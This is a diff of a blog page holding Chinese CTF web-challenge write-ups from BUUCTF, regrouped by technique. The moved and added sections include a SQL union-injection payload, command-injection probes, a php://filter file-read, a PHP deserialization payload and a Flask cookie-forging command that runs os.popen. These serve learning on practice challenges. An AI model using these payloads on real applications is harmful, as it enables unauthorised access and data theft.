@@ -441,7 +441,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5k
+                    5.1k
                 </div>
                 
 
@@ -458,7 +458,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="BUU-web分类整理"><a href="#BUU-web分类整理" class="headerlink" title="BUU-web分类整理"></a>BUU-web分类整理</h1><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p><strong>难度：易</strong></p>
+                <h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h1 id="Header以及特殊技巧"><a href="#Header以及特殊技巧" class="headerlink" title="Header以及特殊技巧"></a>Header以及特殊技巧</h1><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：Header请求头</strong></p>
 <table>
 <thead>
@@ -652,7 +652,14 @@
 <p>49是对应的钱数，那么我们直接改一下重发试试。</p>
 <p>得到session：</p>
 <pre><code>eyJtb25leSI6IDEwMCwgImhpc3RvcnkiOiBbIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSIsICJZdW1teSBjaG9jb2xhdGUgY2hpcCBjb29raWUiLCAiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSIsICJmbGFnezEyNWM0ZTc0LWIwNjItNDI0MS1iYTczLTYyODc0Y2RjMjJlY31cbiJdfQ==</code></pre><p>解码得flag</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><strong>难度：易</strong></p>
+<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：swp信息泄露，SSL注入</strong></p>
+<p>shtml -&gt; SSL注入</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：二次注入，无列名注入bypass information_schema</strong></p>
+<p>payload：</p>
+<pre><code class="sql">-1'/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></pre>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：bypass空格RCE，反引号内联，变量覆盖</strong></p>
 <p>命令注入，<code>?ip=127.0.0.1|ls</code>发现存在flag.php和index.php,cat的时候发现各种口吐芬芳，手动fuzz了一下发现ban掉了flag的贪婪匹配，bash，空格。</p>
 <p>index.php里应该有源码，问题在于绕过空格过滤。</p>
@@ -714,7 +721,7 @@ $? 是显示最后命令的退出状态，0表示没有错误，其他表示有�
 echo It is now 一 5月 5 05:16:04 GMT 2020
 在正式执行时会产生以下输出结果：
 It is now 一 5月 5 05:16:04 GMT 2020</code></pre>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><strong>难度：易</strong></p>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：php://filter伪协议</strong></p>
 <p>点击tips发现url变成了：<code>buuoj.cn/?file=flag.php</code>，flag应该是被注释掉了。伪协议读取即可。</p>
 <pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p><strong>难度：易</strong></p>
@@ -788,7 +795,14 @@ $a = new Flag();
 echo serialize($a);
 ?&gt;
 //O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code></pre><p>最后payload</p>
-<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</code></pre><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p><strong>难度：易</strong></p>
+<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</code></pre><h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><p>难度：易</p>
+<p>考点：伪协议bypass<code>if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))</code></p>
+<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p><strong>难度：中等</strong></p>
+<p><strong>考点：require_once的新特性</strong></p>
+<p>软连接过多造成过滤失效</p>
+<p><strong>文章推荐：</strong></p>
+<p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">file_put_content</a></p>
+<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：RCE，简单的PHP反序列化</strong></p>
 <p>一直跳转，抓个包拦截一下。</p>
 <p>发现会自动submit两个参：</p>
@@ -869,38 +883,12 @@ echo serialize($a);
 <pre><code>_SESSION[phpflag]=;s:7:"xxxxxxx";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</code></pre><p>再读真正的flag位置：</p>
 <pre><code>_SESSION[phpflag]=;s:14:"phpflagphpflag";s:7:"xxxxxxx";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}</code></pre><h2 id="0CTF-piapiapia"><a href="#0CTF-piapiapia" class="headerlink" title="0CTF piapiapia"></a>0CTF piapiapia</h2><p><strong>难度：中等</strong></p>
 <p><strong>考点：PHP序列化逃逸</strong></p>
-<h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p><strong>难度：易</strong></p>
+<h1 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h1><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：smarty SSTi</strong></p>
 <p>简单注入，ls即可</p>
 <p>来自王叹之师傅博客中的一张图</p>
 <p><img src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200216204049347-1844990197.png" alt="img"></p>
-<h2 id="Supercalc"><a href="#Supercalc" class="headerlink" title="Supercalc"></a>Supercalc</h2><hr>
-<p><strong>难度：易</strong></p>
-<p><strong>知识点：flask cookie伪造，flask session的安全问题</strong></p>
-<p>先输入一个<code>1+1</code>看一下包，注意到了session：</p>
-<pre><code>eyJoaXN0b3J5IjpbeyJjb2RlIjoiMSArIDEifV19.X4U6iA.oBstq0I1OScfmGf90WwDQ2ZJTDk</code></pre><p>有点像flask的。。。</p>
-<p>解一下（leavesong）：</p>
-<pre><code class="python">{'money': 9000, 'history': ['flag{23579e93-60f6-4ab2-b28c-b2118548ca9f}\n'], 'anti_tamper_hmac': '745fed2952b33f08eab8bee8db65a7e9'}//我不知道为什么会蹦出来picklestore里的flag·····
-{'history': [{'code': '1 + 1'}]} //这个是应该有的</code></pre>
-<p>反正继续做的话，应该是可以搞的，应该是继续伪造cookie</p>
-<p>key应该还是要通过来获得，利用<code>#</code>注释来尝试一下：</p>
-<pre><code>1/0#{{config}}</code></pre><p>果然找到了：</p>
-<pre><code>SECRET_KEY&amp;#39;: &amp;#39;cded826a1e89925035cc05f0907855f7</code></pre><p>伪造cookie：</p>
-<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a>   注意在linux下</p>
-<pre><code class="shell">root@kali:~/Desktop/flask-session-cookie-manager
-python3 flask_session_cookie_manager3.py encode -s "cded826a1e89925035cc05f0907855f7" -t "{'history': [{'code': '__import__(\"os\").popen(\"cat flag.txt\").read()'}]}"                                                                 一开始我用的ls确定了是flag.txt            
-</code></pre>
-<p>伪造cookie重发即可，firefox中有自带重发以及preview，推荐</p>
-<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p><strong>难度：易</strong></p>
-<p><strong>考点：SSTI模板注入，url_for</strong></p>
-<p>过滤：</p>
-<pre><code class="python">def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s</code></pre>
-<p>绕过：<code>url_for</code></p>
-<h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2><h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p><strong>难度：易</strong></p>
-<p><strong>考点：二次注入，无列名注入bypass information_schema</strong></p>
-<p>payload：</p>
-<pre><code class="sql">-1'/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></pre>
-<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><strong>难度：易</strong></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><strong>难度：易</strong></p>
 <p><strong>考点：Twig模板注入</strong></p>
 <p>由于题目给了cookie提示，直接看cookie，只有：</p>
 <pre><code class="http">Set-Cookie: user=1; expires=Wed, 26-Oct-2020 07:57:40 GMT; Max-Age=1800</code></pre>
@@ -960,6 +948,28 @@ python3 flask_session_cookie_manager3.py encode -s "cded826a1e89925035cc05f09078
 </ul>
 </li>
 </ul>
+<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：SSTI模板注入，url_for</strong></p>
+<p>过滤：</p>
+<pre><code class="python">def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s</code></pre>
+<p>绕过：<code>url_for</code></p>
+<h2 id="Supercalc"><a href="#Supercalc" class="headerlink" title="Supercalc"></a>Supercalc</h2><hr>
+<p><strong>难度：易</strong></p>
+<p><strong>知识点：flask cookie伪造，flask session的安全问题</strong></p>
+<p>先输入一个<code>1+1</code>看一下包，注意到了session：</p>
+<pre><code>eyJoaXN0b3J5IjpbeyJjb2RlIjoiMSArIDEifV19.X4U6iA.oBstq0I1OScfmGf90WwDQ2ZJTDk</code></pre><p>有点像flask的。。。</p>
+<p>解一下（leavesong）：</p>
+<pre><code class="python">{'money': 9000, 'history': ['flag{23579e93-60f6-4ab2-b28c-b2118548ca9f}\n'], 'anti_tamper_hmac': '745fed2952b33f08eab8bee8db65a7e9'}//我不知道为什么会蹦出来picklestore里的flag·····
+{'history': [{'code': '1 + 1'}]} //这个是应该有的</code></pre>
+<p>反正继续做的话，应该是可以搞的，应该是继续伪造cookie</p>
+<p>key应该还是要通过来获得，利用<code>#</code>注释来尝试一下：</p>
+<pre><code>1/0#{{config}}</code></pre><p>果然找到了：</p>
+<pre><code>SECRET_KEY&amp;#39;: &amp;#39;cded826a1e89925035cc05f0907855f7</code></pre><p>伪造cookie：</p>
+<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a>   注意在linux下</p>
+<pre><code class="shell">root@kali:~/Desktop/flask-session-cookie-manager
+python3 flask_session_cookie_manager3.py encode -s "cded826a1e89925035cc05f0907855f7" -t "{'history': [{'code': '__import__(\"os\").popen(\"cat flag.txt\").read()'}]}"                                                                 一开始我用的ls确定了是flag.txt            
+</code></pre>
+<p>伪造cookie重发即可，firefox中有自带重发以及preview，推荐</p>
 <h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p><strong>知识点：逻辑漏洞，cookie伪造，python反序列化</strong></p>
 <p><strong>难度：中等</strong></p>
 <p>登陆后是一个商城界面，发现视频下面写了：<code>==爆破*站：资金募集 11540.0==</code></p>
@@ -1182,42 +1192,78 @@ h.hexdigest()
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/ab7.html">
+                <a href="/posts/8df7.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="BUU-web分类整理">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/14.jpg" class="responsive-img" alt="Recording of Life">
                         
-                        <span class="card-title">BUU-web分类整理</span>
+                        <span class="card-title">Recording of Life</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            BUU-web分类整理[BJDCTF 2nd]假猪套天下第一难度：易
-考点：Header请求头
-
-
-
-Header
-解释
-示例
-
-
-
-Accept
-指定客户端能够接收的内容类型
-Accept: text/plain, text/html,a
+                            没啥，就是记记杂事，非技术
+有的东西不过很久是不可能理解的，有的东西等到理解了又为时已晚，大多数时候，我们不得不 在尚未清楚认识自己的情况下选择行动，因而感到迷惘和困惑。
+十分感谢身边志同道合的朋友，真的让我感受到和一个人学习的不一样。虽然
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2120-12-12
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            V1cuna
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E9%9A%8F%E7%AC%94/">
+                        <span class="chip bg-color">-随笔</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/7f16.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg" class="responsive-img" alt="BUU-crypto">
+                        
+                        <span class="card-title">BUU-crypto</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-05
                             </span>
                         <span class="publish-author">
                             
@@ -1227,7 +1273,6 @@ Accept: text/plain, text/html,a
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1243,44 +1288,10 @@ Accept: text/plain, text/html,a
                         <span class="chip bg-color">BUU</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/271d.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="Laravel 5.8.x 漏洞分析">
-                        
-                        <span class="card-title">Laravel 5.8.x 漏洞分析</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Laravel 5.8.x 漏洞分析据中哥说①环境出了点问题②有五条链子，但是我今天自己只跟出来三条（一条好像被修了）。。。wtcl，没分析出来的我把连接放上。
-搭建环境composer create-project --prefer-di
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-02
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            V1cuna
-                            
-                        </span>
-                    </div>
+                    <a href="/tags/crypto/">
+                        <span class="chip bg-color">crypto</span>
+                    </a>
+                    
                 </div>
                 
             </div>
